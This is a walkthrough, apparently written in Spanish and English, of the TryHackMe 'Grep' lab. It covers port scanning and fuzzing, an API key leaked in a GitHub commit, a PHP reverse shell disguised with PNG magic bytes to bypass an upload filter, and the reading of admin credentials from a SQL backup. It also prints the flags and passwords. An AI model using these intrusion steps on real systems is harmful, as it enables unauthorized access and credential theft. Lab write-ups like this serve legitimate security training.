# Grep


A challenge that tests your reconnaissance and OSINT skills.

https://tryhackme.com/room/greprtp

# Task 1 Grep

Welcome to the OSINT challenge, part of TryHackMe’s Red Teaming Path. In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Start by deploying the machine; Click on the `Start Machine` button in the upper-right-hand corner of this task to deploy the virtual machine for this room.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies.

**Note:** Please allow the machine 3 - 5 minutes to fully boot. Also, no local privilege escalation is necessary to answer the questions.

## Escaneo

```
 nmap -n -Pn -sV --min-rate 9000 -vv -p- -oN nmap 10.82.130.26
 
Host is up, received user-set (0.32s latency).
Scanned at 2025-12-22 00:20:51 UTC for 76s
Not shown: 44578 closed tcp ports (reset), 20953 filtered tcp ports (no-response)
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open  ssl/http syn-ack ttl 62 Apache httpd 2.4.41
51337/tcp open  http     syn-ack ttl 62 Apache httpd 2.4.41
Service Info: Host: ip-10-82-130-26.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.13 seconds
           Raw packets sent: 483800 (21.287MB) | Rcvd: 48577 (1.945MB)
```

## Directorios
### Puerto 80

```
ffuf -u http://10.82.130.26/FUZZ  -w /usr/share/wordlists/directory-list-2.3-medium.txt -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
 

                        [Status: 200, Size: 11509, Words: 3526, Lines: 378, Duration: 184ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 150ms]
phpmyadmin              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 150ms]
                        [Status: 200, Size: 11509, Words: 3526, Lines: 378, Duration: 157ms]
:: Progress: [63366/220547] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:08] :: Errors: 0 ::
```

### Puerto 443

```
## ubject Name

Country US State/Province Some-State Organization SearchME Common Name grep.thm

## Issuer Name

Country US State/Province Some-State Organization SearchME Common Name grep.thm

```
- Agregar a /etc/hosts

## Answer the questions below

### What is the API key that allows a user to register on the website?

```

https://github.com/supersecuredeveloper/searchmecms


### [`‎api/register.php‎`](https://github.com/supersecuredeveloper/searchmecms/commit/db11421db2324ed0991c36493a725bf7db9bdcf6#diff-27defe78d4195858e9a46e2241bdd22a65a8c91d08a2a3e6aa742806fbc16094)

+1-1Lines changed: 1 addition & 1 deletion

|Original file line number|Diff line number|Diff line change|
|---|---|---|
|`   @@ -4,7 +4,7 @@   `|   |   |   |
|`       `|
|`   $headers = apache_request_headers();   `|
|`       `|
|`   if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'ffe60ecaa8bba2f12b43d1a4b15b8f39') {   `|
|`   if (isset($headers['X-THM-API-Key']) && $headers['X-THM-API-Key'] === 'TBA') {   `|
|`   $input = json_decode(file_get_contents('php://input'), true);   `|
|`       `|
|`   $stmt = $mysqli->prepare("INSERT INTO users (username, password, email, name) VALUES (?, ?, ?, ?)");   `|
||   |   |   |
```

ffe60ecaa8bba2f12b43d1a4b15b8f39

- registrar usuario
```
POST /api/register.php HTTP/1.1
Host: grep.thm
Cookie: PHPSESSID=opd1kpol1eepbvl3pd705k0hep
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://grep.thm/public/html/register.php
Content-Type: application/json
X-Thm-Api-Key: ffe60ecaa8bba2f12b43d1a4b15b8f39
Content-Length: 73
Origin: https://grep.thm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"xpc","password":"xpc","email":"xpc@xpc.com","name":"hacker"}




HTTP/1.1 200 OK
Date: Mon, 22 Dec 2025 00:45:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 38
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"message":"Registration successful."}

```

### What is the first flag?

THM{4ec9806d7e1350270dc402ba870ccebb}

### What is the email of the "admin" user?

ffe60ecaa8bba2f12b43d1a4b15b8f39
youcantseeme

https://grep.thm/public/html/upload.php

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
hexedit reverse.png.php
89 50 4e 47
Ctrl+X
```

https://grep.thm/api/uploads/

```
$ pwd
/var/www/backup
$ cat users.sql | grep admin
-- https://www.phpmyadmin.net/
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');
```

admin@searchme2023cms.grep.thm


### What is the host name of the web application that allows a user to check an email for a possible password leak?

leakchecker.grep.thm


### What is the password of the "admin" user?

Se prueba en el dominio anterior el correo y da el pass


admin_tryhackme!
